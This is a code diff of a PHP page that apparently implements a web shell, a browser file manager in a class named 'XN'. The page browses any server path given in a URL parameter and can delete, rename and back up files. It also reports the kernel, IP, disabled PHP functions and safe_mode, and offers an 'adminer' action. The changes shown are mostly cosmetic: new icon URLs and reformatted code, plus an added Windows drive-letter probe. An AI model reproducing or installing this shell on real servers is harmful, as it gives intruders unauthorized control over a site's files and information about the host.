@@ -160,141 +160,82 @@ class XN
             case 'php5':
             case 'php6':
             case 'phtml':
-            case 'php':
-                self::vers(
-                    'https://image.flaticon.com/icons/svg/337/337947.svg'
-                );
+            case 'php':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306154.svg');
                 break;
             case 'html':
-            case 'htm':
-                self::vers(
-                    'https://image.flaticon.com/icons/svg/337/337937.svg'
-                );
+            case 'htm':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306098.svg');
                 break;
-            case 'css':
-                self::vers(
-                    'https://image.flaticon.com/icons/svg/136/136527.svg'
-                );
+            case 'css':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306041.svg');
                 break;
-            case 'js':
-                self::vers(
-                    'https://image.flaticon.com/icons/svg/337/337941.svg'
-                );
+            case 'js':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306122.svg');
                 break;
-            case 'json':
-                self::vers(
-                    'https://image.flaticon.com/icons/svg/136/136525.svg'
-                );
+            case 'json':self::vers('https://image.flaticon.com/icons/svg/136/136525.svg');
                 break;
-            case 'xml':
-                self::vers(
-                    'https://image.flaticon.com/icons/svg/337/337959.svg'
-                );
+            case 'xml':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306209.svg');
                 break;
-            case 'py':
-                self::vers(
-                    'https://image.flaticon.com/icons/svg/617/617531.svg'
-                );
+            case 'py':self::vers('https://www.flaticon.com/svg/static/icons/svg/2721/2721287.svg');
                 break;
-            case 'zip':
-                self::vers(
-                    'https://image.flaticon.com/icons/svg/2306/2306214.svg'
-                );
+            case 'zip':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306214.svg');
                 break;
-            case 'rar':
-                self::vers(
-                    'https://image.flaticon.com/icons/svg/2306/2306170.svg'
-                );
+            case 'rar':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306170.svg');
                 break;
-            case 'htaccess':
-                self::vers(
-                    'https://image.flaticon.com/icons/png/128/1720/1720444.png'
-                );
+            case 'htaccess':self::vers('https://image.flaticon.com/icons/png/128/1720/1720444.png');
                 break;
-            case 'txt':
-                self::vers(
-                    'https://image.flaticon.com/icons/svg/136/136538.svg'
-                );
+            case 'txt':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306185.svg');
                 break;
-            case 'ini':
-                self::vers(
-                    'https://image.flaticon.com/icons/svg/1126/1126890.svg'
-                );
+            case 'ini':self::vers('https://image.flaticon.com/icons/svg/1126/1126890.svg');
                 break;
-            case 'mp3':
-                self::vers(
-                    'https://image.flaticon.com/icons/svg/337/337944.svg'
-                );
+            case 'mp3':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306139.svg');
                 break;
-            case 'mp4':
-                self::vers(
-                    'https://image.flaticon.com/icons/svg/2306/2306142.svg'
-                );
+            case 'mp4':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306142.svg');
                 break;
             case 'log':
             case 'log1':
-            case 'log2':
-                self::vers(
-                    'https://image.flaticon.com/icons/svg/2306/2306124.svg'
-                );
+            case 'log2':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306124.svg');
                 break;
-            case 'dat':
-                self::vers(
-                    'https://image.flaticon.com/icons/svg/2306/2306050.svg'
-                );
+            case 'dat':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306050.svg');
                 break;
-            case 'exe':
-                self::vers(
-                    'https://image.flaticon.com/icons/svg/136/136531.svg'
-                );
+            case 'exe':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306085.svg');
                 break;
-            case 'apk':
-                self::vers(
-                    'https://1.bp.blogspot.com/-HZGGTdD2niI/U2KlyCpOVnI/AAAAAAAABzI/bavDJBFSo-Q/s1600/apk-icon.jpg'
-                );
+            case 'apk':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306016.svg');
                 break;
-            case 'yaml':
-                self::vers(
-                    'https://cdn1.iconfinder.com/data/icons/hawcons/32/698694-icon-103-document-file-yml-512.png'
-                );
+            case 'yaml':self::vers('https://cdn1.iconfinder.com/data/icons/hawcons/32/698694-icon-103-document-file-yml-512.png');
                 break;
-            case 'bak':
-                self::vers(
-                    'https://image.flaticon.com/icons/svg/2125/2125736.svg'
-                );
+            case 'bak':self::vers('https://image.flaticon.com/icons/svg/2125/2125736.svg');
                 break;
-            case 'ico':
-                self::vers(
-                    'https://image.flaticon.com/icons/svg/1126/1126873.svg'
-                );
+            case 'ico':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306102.svg');
                 break;
-            case 'png':
-                self::vers(
-                    'https://image.flaticon.com/icons/svg/337/337948.svg'
-                );
+            case 'png':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306156.svg');
                 break;
             case 'jpg':
-            case 'jpeg':
-            case 'webp':
-                self::vers(
-                    'https://image.flaticon.com/icons/svg/337/337940.svg'
-                );
+            case 'webp':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306117.svg');
                 break;
-            case 'svg':
-                self::vers(
-                    'https://image.flaticon.com/icons/svg/337/337954.svg'
-                );
+            case 'jpeg':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306114.svg');
                 break;
-            case 'gif':
-                self::vers(
-                    'https://image.flaticon.com/icons/svg/337/337936.svg'
-                );
+            case 'svg':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306179.svg');
                 break;
-            case 'pdf':
-                self::vers(
-                    'https://image.flaticon.com/icons/svg/337/337946.svg'
-                );
+            case 'gif':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306094.svg');
                 break;
+            case 'pdf':self::vers('https://www.flaticon.com/svg/static/icons/svg/2306/2306145.svg');
+                break;
+            case 'asp':self::vers("https://www.flaticon.com/svg/static/icons/svg/2306/2306019.svg");
+            	break;
+            case 'doc':self::vers("https://www.flaticon.com/svg/static/icons/svg/2306/2306060.svg");
+            	break;
+            case 'docx':self::vers("https://www.flaticon.com/svg/static/icons/svg/2306/2306065.svg");
+            	break;
+            case 'otf':self::vers("https://www.flaticon.com/svg/static/icons/svg/2306/2306149.svg");
+            	break;
+            case 'ttf':self::vers("https://www.flaticon.com/svg/static/icons/svg/2306/2306182.svg");
+            	break;
+            case 'wav':self::vers("https://www.flaticon.com/svg/static/icons/svg/2306/2306188.svg");
+            	break;
+            case 'sql':self::vers("https://www.flaticon.com/svg/static/icons/svg/2306/2306173.svg");
+            	break;
+            case 'csv':self::vers("https://www.flaticon.com/svg/static/icons/svg/2306/2306046.svg");
+            	break;
+            case 'bat':self::vers("https://www.flaticon.com/svg/static/icons/svg/2306/2306025.svg");
+            	break;
             default:
                 self::vers(
                     'https://image.flaticon.com/icons/svg/833/833524.svg'
@@ -818,6 +759,27 @@ class XN
                 return self::formatSize($used);
                 break;
         }
+    }
+    public function disk($path)
+    {
+    	$array = "";
+    	$explode = explode('\\', $path);
+    	$explode = $explode[0];
+    	foreach (range("A", "Z") as $value) {
+    	 	$bool = $isdiskette  = in_array($value, array("A"));
+    	 	if (!$bool) $bool = is_dir("{$value}:\\");
+    	 	if ($bool) {
+    	 		$array .= "[ <a href='?x={$value}:\\'".($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"":"").">";
+    	 		if ($array . ":" != $explode) {
+    	 			$array .= $value;
+    	 		} else {
+    	 			$array .= "<font color='green'>{$value}</font>";
+    	 		} $array .= "</a> ]";
+    	 	}
+    	 }
+    	 if (!empty($array)) {
+    	 	print("detected device : {$array}");
+    	 }
     }
     public static function countAllFiles($directory)
     {
@@ -1683,6 +1645,14 @@ function alert($message)
     .box > h2 {
         text-align: left;
     }
+    .nothing {
+    	background: rgba(255, 0, 0, 0.2);
+    	color: rgba(255, 0, 0, 0.6);
+    	border-radius:15px;
+    	padding:15px;
+    	text-align: center;
+    	font-style: italic;
+    }
     @media (min-width: 320px) and (max-width: 480px) {
         body {
             background: #fff;
@@ -1771,74 +1741,31 @@ function alert($message)
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-modal/0.9.1/jquery.modal.min.js"></script>
 <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
 <script type="text/javascript">
-    $(function() {
-        $('.dropdown-toggle').click(function(){
-            $(this).next('.dropdown').toggle();
-        });
-        $(document).click(function(e) {
-            var target = e.target;
-            if (!$(target).is('.dropdown-toggle') && !$(target).parents().is('.dropdown-toggle')) {
-                $('.dropdown').hide();
-            }
-        });
-    });
+    $(function() {$('.dropdown-toggle').click(function(){$(this).next('.dropdown').toggle();});
+        $(document).click(function(e){var target=e.target;if(!$(target).is('.dropdown-toggle')&&!$(target).parents().is('.dropdown-toggle')){$('.dropdown').hide();}});});
 </script>
 <script type="text/javascript">
-    $(function() {
-        $('.dropdown-toggle').click(function(){
-            $(this).next('.dropdown-tool').toggle();
-        });
-        $(document).click(function(e) {
-            var target = e.target;
-            if (!$(target).is('.dropdown-toggle') && !$(target).parents().is('.dropdown-toggle')) {
-                $('.dropdown-tool').hide();
-            }
-        });
-    });
-    var max_fields = 10;
-    var x = 1;
-    $(document).on('click', '#add_input', function(e){
-        if(x < max_fields){
-            x++;
-            $('#output').append('<div id=\"out\"><input type=\"text\" name=\"filename[]\"><a href="#" class=\"remove\">remove</a></div></div></div>');
-        }
-        $('#output').on("click",".remove", function(e){
-            e.preventDefault(); $(this).parent('#out').remove(); x--;
-            repeat();
-        })
-    });
+    $(function(){$('.dropdown-toggle').click(function(){$(this).next('.dropdown-tool').toggle();});
+        $(document).click(function(e){var target=e.target;if(!$(target).is('.dropdown-toggle')&&!$(target).parents().is('.dropdown-toggle')){$('.dropdown-tool').hide();}});});
+    var max_fields=10;var x=1;
+    $(document).on('click','#add_input',function(e){if(x<max_fields){x++;$('#output').append('<div id=\"out\"><input type=\"text\" name=\"filename[]\"><a href="#" class=\"remove\">remove</a></div></div></div>');}
+        $('#output').on("click",".remove", function(e){e.preventDefault(); $(this).parent('#out').remove(); x--;repeat();})});
 </script>
 <script>
 function filterTable() {
-    var input, filter, table, tr, td, i;
-    input = document.getElementById("Input");
-    filter = input.value.toUpperCase();
-    table = document.getElementById("myTable");
-    tr = table.getElementsByTagName("tr");
-    for (i = 0; i < tr.length; i++) {
-        td = tr[i].getElementsByTagName("td")[0];
-        if (td) {
-            if (td.innerHTML.toUpperCase().indexOf(filter) > -1) {
-                tr[i].style.display = "";
-            } else {
-                tr[i].style.display = "none";
-            }
-        }
-    }
+    var input,filter,table,tr,td,i;
+    input=document.getElementById("Input");
+    filter=input.value.toUpperCase();
+    table=document.getElementById("myTable");
+    tr=table.getElementsByTagName("tr");
+    for(i=0;i<tr.length;i++){td=tr[i].getElementsByTagName("td")[0];
+        if(td){if(td.innerHTML.toUpperCase().indexOf(filter)>-1){tr[i].style.display="";}
+    	else{tr[i].style.display="none";}}}
 }
 </script>
 <script type="text/javascript">
- $(document).ready(function() {
-     $(".open").on("click", function() {
-       $(".container").fadeIn();
-       $(".open").fadeOut();
-     });
-
-     $(".close").on("click", function() {
-       $(".container").fadeOut();
-       $(".open").fadeIn();
-     });
- });
+ 	$(document).ready(function(){$(".open").on("click",function(){$(".container").fadeIn();$(".open").fadeOut();});
+ 	$(".close").on("click",function(){$(".container").fadeOut();$(".open").fadeIn();});});
 </script>
 <script type="text/javascript">
     jqxAlert = {
@@ -1918,13 +1845,13 @@ function filterTable() {
     switch (@$_POST['action']) {
         case 'delete':
             if (XN::delete($_POST['file'])) {
-                alert("" . basename($_POST['file']) . " Deleted");
+                alert("".basename($_POST['file'])." Deleted");
             } else {
                 alert("Permission Danied");
             }
             break;
         case 'info':
-            head('Server Info', getcwd(), 'hidden'); ?>
+            head('Server Info',getcwd(),'hidden'); ?>
             <div class="info">
                 <table>
                     <tr>
@@ -1933,7 +1860,7 @@ function filterTable() {
                         </td>
                         <td>
                             <div class="engine">
-                                <input type="text" value="<?= XN::info('kernel') ?>">
+                                <input type="text" value="<?=XN::info('kernel')?>">
                             </div>
                         </td>
                     </tr>
@@ -1943,7 +1870,7 @@ function filterTable() {
                         </td>
                         <td>
                             <div class="engine">
-                                <input type="text" value="<?= XN::info('software') ?>" readonly>
+                                <input type="text" value="<?=XN::info('software')?>" readonly>
                             </div>
                         </td>
                     </tr>
@@ -1953,7 +1880,7 @@ function filterTable() {
                         </td>
                         <td>
                             <div class="engine">
-                                <input type="text" value="<?= XN::info('ip') ?>" readonly>
+                                <input type="text" value="<?=XN::info('ip')?>" readonly>
                             </div>
                         </td>
                     </tr>
@@ -1963,7 +1890,7 @@ function filterTable() {
                         </td>
                         <td>
                             <div class="engine">
-                                <input type="text" value="<?= XN::info('phpversion') ?>" readonly>
+                                <input type="text" value="<?=XN::info('phpversion')?>" readonly>
                             </div>
                         </td>
                     </tr>
@@ -1973,7 +1900,7 @@ function filterTable() {
                         </td>
                         <td>
                             <div class="engine">
-                                <input type="text" value="<?= XN::info('domain') ?>" readonly>
+                                <input type="text" value="<?=XN::info('domain')?>" readonly>
                             </div>
                         </td>
                     </tr>
@@ -1983,7 +1910,7 @@ function filterTable() {
                         </td>
                         <td>
                             <div class="engine">
-                                <input type="text" value="<?= XN::info('disable_function') ?>">
+                                <input type="text" value="<?=XN::info('disable_function')?>">
                             </div>
                         </td>
                     </tr>
@@ -1993,13 +1920,13 @@ function filterTable() {
                         </td>
                         <td>
                             <div class="engine">
-                                <input type="text" value="<?= XN::info('safe_mode') ?>" readonly>
+                                <input type="text" value="<?=XN::info('safe_mode')?>" readonly>
                             </div>
                         </td>
                     </tr>
                     <tr>
                         <td class="info" colspan="3">
-                            <?= XN::info('lib') ?>
+                            <?=XN::info('lib')?>
                         </td>
                     </tr>
                 </table>
@@ -2009,10 +1936,10 @@ function filterTable() {
             break;
 
         case 'backup':
-            if (XN::save($_POST['file'] . ".bak", file_get_contents($_POST['file']))) {
+            if (XN::save($_POST['file'].".bak",file_get_contents($_POST['file']))) {
                 alert('failed');
             } else {
-                alert("" . basename($_POST['file']) . " has been backup !");
+                alert("".basename($_POST['file'])." has been backup !");
             }
             break;
         case 'adminer':
@@ -2318,10 +2245,18 @@ function filterTable() {
         <br><span>Total : <?= XN::hdd('total') ?></span> <span>|</span>
         <span>Free : <?= XN::hdd('free') ?></span> <span>|</span>
         <span>Used : <?= XN::hdd('used') ?></span>
+        <div>
+        	<?= XN::disk(getcwd()) ?>
+        </div>
     </div>
     <div class="table">
     <table id="myTable">
         <?php
+        if (!XN::countDir(getcwd())) { ?>
+        	<div class="nothing">
+        		Not files in here
+        	</div>
+        <?php }
         foreach (XN::files('dir') as $dir) { ?>
             <tr>
                 <td class="border1 hover">
@@ -2363,27 +2298,19 @@ function filterTable() {
                                     <button name="action" value="delete">Delete</button>
                                 </li>
                                 <li>
-                                    <a href="#rename<?= XN::replace(
-                                        $dir['names']
-                                    ) ?>" rel="modal:open">Rename</a>
+                                    <a href="#rename<?= XN::replace($dir['names']) ?>" rel="modal:open">Rename</a>
                                 </li>
-                                <input type="hidden" name="file" value="<?= $dir[
-                                    'name'
-                                ] ?>">
+                                <input type="hidden" name="file" value="<?= $dir['name'] ?>">
                             </form>
                         </ul>
                     </nav>
                     <!-- Action Rename -->
-                    <div id="rename<?= XN::replace(
-                        $dir['names']
-                    ) ?>" class="modal modal-rename">
+                    <div id="rename<?= XN::replace($dir['names']) ?>" class="modal modal-rename">
                         <div class="rename">
                             <h2>Rename</h2>
                             <form method="post" action="?x=<?= getcwd() ?>">
                                 <div>
-                                    <input type="text" name="newname" value="<?= $dir[
-                                        'names'
-                                    ] ?>">
+                                    <input type="text" name="newname" value="<?= $dir['names'] ?>">
                                 </div>
                                 <div>
                                     <button name="action" value="rename">Rename</button>
@@ -2412,11 +2339,7 @@ function filterTable() {
                                         <?= $file['size'] ?>
                                     </div>
                                     <div class="file-perms">
-                                        <?= XN::wr(
-                                            $file['name'],
-                                            XN::perms($file['name']),
-                                            2
-                                        ) ?>
+                                        <?= XN::wr($file['name'],XN::perms($file['name']),2) ?>
                                     </div>
                                     <div class="file-time">
                                         <?= $file['ftime'] ?>
@@ -2439,43 +2362,23 @@ function filterTable() {
                         <ul class="dropdown">
                             <form method="post" action="?x=<?= getcwd() ?>">
                                 <?php
-                                $rep = str_replace(
-                                    [' ', '.', ':', '-', '(', ')'],
-                                    '',
-                                    $file['names']
-                                );
+                                $rep = str_replace([' ', '.', ':', '-', '(', ')'],'',$file['names']);
                                 switch (XN::getext($file['name'])) {
                                     case 'mp4':
                                     case 'mp3':
                                         switch (XN::getext($file['name'])) {
                                             case 'mp3':
-                                                $result = str_replace(
-                                                    'mp3',
-                                                    'Audio',
-                                                    XN::getext($file['name'])
-                                                );
+                                                $result = str_replace('mp3','Audio',XN::getext($file['name']));
                                                 break;
                                             case 'mp4':
-                                                $result = str_replace(
-                                                    'mp4',
-                                                    'Video',
-                                                    XN::getext($file['name'])
-                                                );
+                                                $result = str_replace('mp4','Video',XN::getext($file['name']));
                                                 break;
                                         } ?>
                                         <li>
                                             <a href="#ex1<?= $rep ?>" rel="modal:open">Play</a>
                                             <div id="ex1<?= $rep ?>" class="modal">
                                                 <<?= $result ?> controls>
-                                                    <source src="<?= str_replace(
-                                                        $_SERVER[
-                                                            'DOCUMENT_ROOT'
-                                                        ],
-                                                        '',
-                                                        $file["name"]
-                                                    ) ?>" type="<?= $result ?>/<?= XN::getext(
-    $file['name']
-) ?>">
+                                                    <source src="<?= str_replace($_SERVER['DOCUMENT_ROOT'],'',$file["name"]) ?>" type="<?= $result ?>/<?= XN::getext($file['name']) ?>">
                                                 </<?= $result ?>>
                                             </div>
                                         </li>
@@ -2483,9 +2386,7 @@ function filterTable() {
                                             <button name="action" value="delete">Delete</button>
                                         </li>
                                         <li>
-                                            <a href="#rename<?= XN::replace(
-                                                $file['names']
-                                            ) ?>" rel="modal:open">Rename</a>
+                                            <a href="#rename<?= XN::replace($file['names']) ?>" rel="modal:open">Rename</a>
                                         </li>
                                         <?php break;
                                     case 'zip': ?>
@@ -2496,9 +2397,7 @@ function filterTable() {
                                             <button name="action" value="delete">Delete</button>
                                         </li>
                                         <li>
-                                            <a href="#rename<?= XN::replace(
-                                                $file['names']
-                                            ) ?>" rel="modal:open">Rename</a>
+                                            <a href="#rename<?= XN::replace($file['names']) ?>" rel="modal:open">Rename</a>
                                         </li>
                                         <?php break;case 'jpg':
                                     case 'png':
@@ -2509,20 +2408,14 @@ function filterTable() {
                                         <li>
                                             <a href="#ex1<?= $rep ?>" rel="modal:open">Preview</a>
                                             <div id="ex1<?= $rep ?>" class="modal">
-                                                <img src="<?= str_replace(
-                                                    $_SERVER['DOCUMENT_ROOT'],
-                                                    '',
-                                                    $file['name']
-                                                ) ?>">
+                                                <img src="<?= str_replace($_SERVER['DOCUMENT_ROOT'],'',$file['name']) ?>">
                                             </div>
                                         </li>
                                         <li>
                                             <button name="action" value="delete">Delete</button>
                                         </li>
                                         <li>
-                                            <a href="#rename<?= XN::replace(
-                                                $file['names']
-                                            ) ?>" rel="modal:open">Rename</a>
+                                            <a href="#rename<?= XN::replace($file['names']) ?>" rel="modal:open">Rename</a>
                                         </li>
                                         <?php break;default: ?>
                                         <li>
@@ -2532,39 +2425,29 @@ function filterTable() {
                                             <button name="action" value="delete">Delete</button>
                                         </li>
                                         <li>
-                                            <a href="#rename<?= XN::replace(
-                                                $file['names']
-                                            ) ?>" rel="modal:open">Rename</a>
+                                            <a href="#rename<?= XN::replace($file['names']) ?>" rel="modal:open">Rename</a>
                                         </li>
                                         <li>
                                             <button name="action" value="backup">Backup</button>
                                         </li>
                                         <?php break;}
                                 ?>
-                                <input type="hidden" name="file" value="<?= $file[
-                                    'name'
-                                ] ?>">
+                                <input type="hidden" name="file" value="<?= $file['name'] ?>">
                             </form>
                         </ul>
                     </nav>
                     <!-- Action Rename -->
-                    <div id="rename<?= XN::replace(
-                        $file['names']
-                    ) ?>" class="modal modal-rename">
+                    <div id="rename<?= XN::replace($file['names']) ?>" class="modal modal-rename">
                         <div class="rename">
                             <h2>Rename</h2>
                             <form method="post" action="?x=<?= getcwd() ?>">
                                 <div>
-                                    <input type="text" name="newname" value="<?= $file[
-                                        'names'
-                                    ] ?>">
+                                    <input type="text" name="newname" value="<?= $file['names'] ?>">
                                 </div>
                                 <div>
                                     <button name="action" value="rename">Rename</button>
                                 </div>
-                                <input type="hidden" name="file" value="<?= $file[
-                                    'name'
-                                ] ?>">
+                                <input type="hidden" name="file" value="<?= $file['name'] ?>">
                             </form>
                         </div>
                     </div>
